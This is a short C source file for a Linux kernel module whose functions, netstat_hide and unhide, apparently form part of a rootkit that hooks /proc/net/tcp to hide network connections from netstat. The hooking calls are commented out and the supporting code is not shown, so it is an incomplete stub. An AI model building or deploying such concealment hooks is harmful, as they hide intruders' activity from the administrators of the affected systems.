#include "hide_proc_net.h"
static int __init netstat_hide(void)
{
    //int ret;
    get_addr();
    //ret = set_ops("/proc/net/tcp");
    //printk(KERN_ALERT "set ops done, ret equals to : %d", ret);

    return 0;
}
static void __exit unhide(void)
{
    //unhook_seq();
}
MODULE_LICENSE("GPL");
module_init(netstat_hide);
module_exit(unhide);